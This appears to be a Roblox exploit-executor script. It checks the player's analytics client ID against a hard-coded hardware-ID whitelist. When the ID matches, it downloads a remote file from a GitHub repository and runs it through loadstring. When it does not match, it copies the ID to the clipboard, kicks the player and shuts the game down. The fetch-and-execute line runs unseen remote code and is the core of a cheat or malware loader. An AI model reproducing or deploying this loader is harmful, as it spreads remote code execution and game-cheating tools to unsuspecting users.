local HWID = {
    "671d53c6-fb20-4766-93e7-cfb8b7292645"
}
local Old = game:GetService("RbxAnalyticsService"):GetClientId()
if game:GetService("RbxAnalyticsService"):GetClientId() ~= Old then 
    while true do end
end
if HWID[table.find(HWID, Old)] == Old then
    loadstring(game:HttpGet"https://raw.githubusercontent.com/Cve-Hub/SongHaPong/main/README.md")()
else
    setclipboard("HWID : "..tostring(Old))
    game.Players.LocalPlayer:Kick("Wrong Hwid Dm Admin!")
    wait(.5)

game:Shutdown()
end
